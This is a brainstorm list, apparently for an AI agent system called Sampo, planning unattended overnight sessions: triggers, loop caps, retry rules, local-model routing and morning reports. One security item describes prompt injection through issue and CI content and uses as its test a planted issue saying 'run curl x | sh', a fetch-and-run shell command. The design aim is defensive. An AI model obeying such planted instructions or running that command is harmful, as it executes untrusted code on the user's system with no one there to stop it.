# Brainstorm — lens: overnight unattended

- **Add a night-run ledger that answers "why did this start?"** — FEATURE — value 5 — effort M — risk low — category: triggers
  Why: Mission 6 wants work to start without the user; nothing in the pack records what woke a session, so morning review can't tell a schedule from a CI hit from a loop.
  Done when: every session started by a trigger has a ledger row (source, event id, fire-or-skip reason), and `sampo trigger why <session>` prints it.

- **Fence trigger payloads as untrusted data under a lower grant tier** — SECURITY — value 5 — effort M — risk med — category: injection
  Why: issue bodies, CI logs and file contents become prompts with no user present; the pack's own Ward is bypass-mode-oriented and nobody is there to refuse. Assumption: triggered sessions currently inherit the standing grants.
  Done when: a planted issue saying "run curl x | sh" is quoted as data, the Ward blocks it, and the run cannot use publish or push grants.

- **Type every drive stop and auto-resume the transient ones** — FIX — value 5 — effort M — risk low — category: drive reliability
  Why: the request names "drive stops appeared (0 to 0.1)"; recent commits (T-2900, T-2901, T-2873) all fix phantom waits on dead or finished agents.
  Done when: each stop records a cause class (usage limit, dead agent, endpoint swap, needs-user); a seeded replay of the three known phantom-wait shapes resumes without a human within a set timeout.

- **Cap trigger depth and add a self-cause filter** — SECURITY — value 4 — effort S — risk low — category: loop safety
  Why: a drive that files tasks, a CI watcher that reacts to its own pushes and file triggers that fire on its own writes can loop all night. Assumption: no depth guard exists today.
  Done when: a synthetic trigger that causes itself stops at depth N and logs a breaker event; commits by Sampo don't fire the CI-red trigger.

- **Retry failed tool calls by class under a budget** — FIX — value 4 — effort M — risk med — category: tool reliability
  Why: "failed tool calls up by half" is a named top gap; unattended runs can't ask the user, so classes (malformed args, missing path, timeout, endpoint cold) need distinct repair or stop rules.
  Done when: a replay of last week's failed calls shows each assigned a class, the repairable ones retried at most twice, and the failed-call rate on the overnight lane drops against baseline.

- **Batch queued installs into one hashed "Overnight yes" card** — FEATURE — value 4 — effort M — risk low — category: approvals
  Why: the request says installs are "queued for one yes"; the steers forbid mid-run prompts. Without one card the morning has scattered asks.
  Done when: installs triggered overnight appear as a single manifest (name, source, version hash, why), one approval applies exactly that set, and any changed hash invalidates the yes.

- **Route trigger triage and background volume to the local model first** — PERFORMANCE — value 5 — effort M — risk med — category: local models
  Why: the user wants local models used without limit for background volume; the model bench (T-2887/2894) and the Smith-on-local exam (T-2908) exist but nothing sends the night's triage to them. Note the pack's 3-minute swap cost, so batch by resident model (qwen3.8-27b first).
  Done when: a night's classify, dedupe and "worth waking a frontier session?" decisions run on the local endpoint, escalation reasons are logged, and frontier tokens for triage drop to near zero.

- **Add a triggers file with a 30-day dry-run replay** — FEATURE — value 4 — effort M — risk low — category: triggers
  Why: schedules, file, CI and issue triggers each need a spec; enabling one blind could storm the queue overnight.
  Done when: `sampo trigger replay <spec> --days 30` prints how many tasks it would have created and the cost estimate, and enabling requires it to have run.

- **Watch the watcher with a dead-man heartbeat** — FIX — value 4 — effort S — risk low — category: monitoring
  Why: the drive was repeatedly wrong about whether agents were running (T-2873/2901); a silent scheduler is the worst overnight failure.
  Done when: killing the scheduler at night produces a recorded "silent" alert by the next morning, and a trigger that should have fired and didn't is listed.

- **Write a sealed night plan and a morning card graded against it** — FEATURE — value 4 — effort M — risk low — category: reporting
  Why: nothing tells the user what overnight progress means; the user's words ("overnight progress unattended") need a measure. Assumption: the user reads a morning summary.
  Done when: before sleep a plan with budget and expected tasks is stored; the morning card shows done / waiting-on-you / unsure against it.

- **Wild: Race several local attempts at each new issue and keep the best passing one** — FEATURE — value 4 — effort L — risk med — category: local models
  Why: wild — if local inference is free, volume substitutes for capability; each attempt is verified by the brief's own Exam, and only a passing one is surfaced, marked unwitnessed.
  Done when: for a test issue, N local attempts run in separate worktrees, and exactly the one passing its Exam is held for review.

- **Wild: Plant a canary issue and CI failure in a scratch repo nightly** — FEATURE — value 3 — effort M — risk low — category: self-test
  Why: wild — the only proof that triggers work is one that fires on a known event; it catches host or endpoint drift before the real night.
  Done when: at 02:00 a planted issue triggers a diagnosis lane, and a miss is on the morning card.

- **Wild: Yield the GPU the instant the user shows up** — FEATURE — value 3 — effort M — risk med — category: local models
  Why: wild — unlimited local use shares hardware with the user's own models; a swap costs ~3 min. Assumption: activity is detectable from the host session or input idle time.
  Done when: opening an interactive session pauses queued local jobs within a minute and the user's model is resident.

- **Wild: Auto-retire any trigger whose output nobody reads** — FEATURE — value 3 — effort S — risk low — category: hygiene
  Why: wild — triggers accrete; each should carry a retirement predicate (e.g. 10 fires, 0 outcomes accepted) and mute itself, writing its own obituary line.
  Done when: a trigger with no accepted outcomes after the threshold is muted and listed in the next card.

Next question: When a trigger-born session fails at 3 a.m., what is the cheapest signal that distinguishes "retry" from "stop and wait for the user", and is it recorded anywhere today?

Next question: Which of the user's standing grants (push, publish, core yes) should a self-started session explicitly not inherit, and who sets that boundary?
